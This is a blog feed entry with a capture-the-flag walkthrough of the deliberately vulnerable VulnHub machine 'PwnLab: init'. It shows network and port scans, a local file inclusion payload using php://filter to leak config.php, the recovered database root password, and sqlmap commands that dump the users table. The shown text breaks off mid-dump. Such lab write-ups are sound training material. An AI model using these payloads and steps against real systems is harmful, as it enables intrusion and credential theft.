<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: pwnlab | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/pwnlab/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2017-04-08T06:53:28-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[VulnHub] PwnLab: init]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init/"/>
    <updated>2016-08-29T06:46:38-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init</id>
    <content type="html"><![CDATA[<p>&ldquo;Wellcome to \"PwnLab: init\&rdquo;, my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.&ldquo; &ndash; <a href="https://www.vulnhub.com/author/claor,331/">Claor</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: PwnLab: init (<em>10.1.1.140/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Local File Inclusion vulnerability</li>
<li>Dump DB tables and crack user credentials</li>
<li>Login and upload webshell/Reverse PHP Shell</li>
<li>Bypass File Extension limit</li>
<li>Exploit <code>setuid</code> sticky bit set file/program to privilege escape</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Local File Inclusion vulnerability found and exploited to discover MySQL login information</li>
<li>Login to MySQL DB and download user table to obtain user/pass</li>
<li>Login to Web application as privilege user and upload webshell/PHP reverse shell</li>
<li>Enumeration after get into the target server and escape to different users</li>
<li>Exploit <code>setuid</code> stikcy bit set program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.140  00:0c:29:11:ce:27   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:ee:0a:4f   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.312 seconds <span class="o">(</span>110.73 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.140</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.140/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-22 13:17:05 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.140                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 3306/tcp on 10.1.1.140                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.140                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 59968/tcp on 10.1.1.140    &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.140
</span><span class='line'>Host is up <span class="o">(</span>0.00028s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: PwnLab Intranet Image Hosting
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35271/udp  status
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          59968/tcp  status
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .5.47-0+deb8u1
</span><span class='line'><span class="p">|</span>   Thread ID: 38
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: ODBCClient, LongPassword, SupportsCompression, Speaks41ProtocolOld, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, SupportsTransactions, Support41Auth
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>_  Salt: <span class="p">&amp;</span>amp<span class="p">;</span>AVi2YKInpe-Lv1.3R<span class="p">&amp;</span>amp<span class="p">;</span>d
</span><span class='line'>59968/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'>MAC Address: 00:0C:29:11:CE:27 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.2 - 4.4
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on the result of NMAP scan, firstly, I found port 80 and 3306 is open.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.140
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET IP address found in the <span class="p">&amp;</span>lsquo<span class="p">;</span>location<span class="p">&amp;</span>rsquo<span class="p">;</span> header. The IP is <span class="p">&amp;</span>ldquo<span class="p">;</span>127.0.1.1<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'>+ OSVDB-630: GET IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://127.0.1.1/images/&quot;</span>&gt;http://127.0.1.1/images/&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'>+ SZYEPUYV Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ GET Cookie PHPSESSID created without the httponly flag
</span><span class='line'>+ GET /config.php: PHP Config file may contain database IDs and passwords.
</span><span class='line'>+ OSVDB-3268: GET /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: GET /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /login.php: Admin login page/section found.
</span></code></pre></td></tr></table></div></figure></p>

<p>From the nikto scan, I noticed that <code>/login.php</code> is found which could be the Admin login page, and <code>/images/</code> directory indexing found, and last but not least, <code>/config.php</code> is found which may contain database IDs and passowrds.</p>

<p>Then I use firefox to open the target website and have a look around.</p>

<p>I was hanging on here for quite a while, after trying brute force the login, tring SQL injection and trying brute force directory but all failed&hellip; I finally found a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/" title="Local File Inclusion with PHP wrappers">LFI vulnerability</a> on the <code>page</code> parameter.</p>

<p>by exploiting this LFI vulnerability and based on the previous Nickto scan result (<code>config.php</code> is found and may contain DB login):</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.140/?page=php://filter/convert.base64-encode/resource=config&quot;</span>&gt;http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>config&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;root@kali:~/myExercises/pwnlab_init#
</span><span class='line'>root@kali:~/myExercises/pwnlab_init# <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span> base64 <span class="p">&amp;</span>ndash<span class="p">;</span>decode
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'><span class="nv">$server</span>   <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>localhost<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>root<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>H4u%QJ_H99<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$database</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>Users<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'>?&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, now I got the database ROOT login (<font color="red"><code>root/H4u%QJ_H99</code></font>) and the DB name is <font color="red"><code>Users</code></font>, then I use <code>sqlmap</code> to check target DB</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>tables -D Users
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 20:02:54&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'>Database: Users
</span><span class='line'><span class="o">[</span><span class="m">1</span> table<span class="o">]</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span><span class='line'><span class="p">|</span> users <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> shutting down at 20:02:54
</span></code></pre></td></tr></table></div></figure></p>

<p>Got the table name is <code>users</code>, then dump the table:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>dump -T users -D Users
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 20:03:23&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>users<span class="p">&amp;</span>rsquo<span class="p">;</span> in database <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;user&#39;</span>, u<span class="s1">&#39;varchar(30)&amp;lsquo;], [u&#39;</span>pass<span class="p">&amp;</span>rsquo<span class="p">;</span>, u<span class="s1">&#39;varchar(30)&amp;lsquo;]]&amp;hellip;</span>
</span><span class='line'><span class="s1">[20:03:24] [INFO] fetching entries for table &#39;</span>users<span class="p">&amp;</span>rsquo<span class="p">;</span> in database <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> analyzing table dump <span class="k">for</span> possible password hashes
</span><span class='line'>Database: Users
</span><span class='line'>Table: users
</span><span class='line'><span class="o">[</span><span class="m">3</span> entries<span class="o">]</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
